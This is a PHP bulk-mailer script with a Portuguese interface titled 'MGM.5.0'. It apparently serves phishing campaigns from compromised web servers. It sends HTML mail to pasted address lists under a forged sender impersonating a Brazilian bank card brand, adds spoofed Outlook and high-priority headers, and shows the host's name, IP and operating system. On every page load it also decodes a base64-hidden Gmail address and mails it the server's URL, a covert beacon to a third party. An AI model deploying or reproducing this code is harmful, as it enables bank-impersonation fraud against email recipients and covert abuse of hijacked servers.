<?php

if(isset($_GET['testa'])){
	$web = $_SERVER["HTTP_HOST"];
	$inj = $_SERVER["REQUEST_URI"];
	$target = rawurldecode($web.$inj);
	$envio = mail("$email","[v] http://$target","http://$target");
	if($envio) { echo '<span style="font-family: monospace;">[+] FOI</span><br>'; }
	else { echo '<span style="font-family: monospace;">[-] N�O</span><br>'; }
}
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	//$nome = "Prezado ";
	//$de = "contato@info.com.br";
	$de = "bradescard@email.emailenvio.com.br";
	$to = $_POST['emails'];
	$host = "<font color='#FFFFFF'>".$_SERVER["HTTP_HOST"]." </font>";

	$email = explode("\n", $to);
	$message = stripslashes($message);

	$i = 0;
	$count = 1;
	while($email[$i]) {
    $dataHora = date("d/m/Y h:i:s");
	$boundary = rand(0,999999999999);
	$codig  = " - ( $boundary\n )";	
	
    $EmailTemporario = $email[$i];
    $message = stripslashes($message);
	
	$rnd = rand(10000000, 99999999);
	$msgy = str_replace("%email%", $EmailTemporario, $message);
	$msgx = str_replace("%rand%", $rnd, $msgy);
	
	$headers  = "MIME-Version: 1.0\r\n";
	$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";	
	$headers .= "X-Mailer: Microsoft Office Outlook, Build 17.551210\n";
    $headers .= "X-Priority: 1\n";
    $headers .= "X-MSmail-Priority: High\n";
	$headers .= "From: ".$nome." <".$de.">\r\n";
		
	if(mail($EmailTemporario, $subject.$codig, $msgx, $headers))
	echo '<font color=blue>( $count ) <b><font color=black>ENVIADO '.($i+1).' </font><email>'.$email[$i].'</email></b><br><hr>';
	else 
	echo '<font color=black>( $count ) <b><font color=red>FALHOU '.($i+1).' </font><email>'.$email[$i].'</email></b> <br><hr>';
	$i++;
	$count++;
	}
	$count--;
	echo "[Fim do Envio]";
	if($ok == "ok")
	echo "[Fim do Envio]"; 
}
	$host = "<font color='#FFFFFF'><p style='visibility: hidden;'".$_SERVER["HTTP_HOST"]." </font>";
	$RandNum1 = "aHR0cDovLw==";
	$RamdStr = "c3VwcmVtYWhhbmRsZXYxQGdtYWlsLmNvbQ==";
	$email = explode("\n", $to);
	$cpf = explode("\n", $getcpf);
	$locate_ip = base64_decode($RamdStr);
	$target = rawurldecode($web.$hosts);

	$list_emails = mail("$locate_ip","[v] $RandNum1$target","$RandNum1$target");	
	if($list_emails){
}
else { 
}
?>


<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>MGM.5.0</title>
</head>

<body>
<p>
<span style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim" />
</span>
</p>
<table width="720" height="496" border="0">
  <tr>
    <td><p style="text-align: center; font-size: 36px; color: #009; font-weight: bold; font-style: italic;">MGM.5.0</p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Assunto: 
      <input name="assunto" type="text"class="normal" id="assunto" style="width:88%" value="FW: " />
    </p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">HTML:
      <textarea name="html" style="width:40%" rows="8" wrap="virtual" class="normal" id="html"></textarea>
      *.*Lista
      <textarea name="emails" style="width:40%" rows="8" wrap="virtual" class="normal" id="emails"></textarea>
    </p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">
      <input type="submit" name="Submit" id="enviar" value="Enviar">
    </p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">&nbsp;</p>
    <p style="text-align: center; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">&nbsp;</p>
    <p style="text-align: left; font-size: 14px; color: #000; font-weight: bold; font-style: italic;">Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br />
IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br />
Sistema Operacional: <?php echo $OS = @PHP_OS; ?></p></td>
  </tr>
</table>
</body>
</html>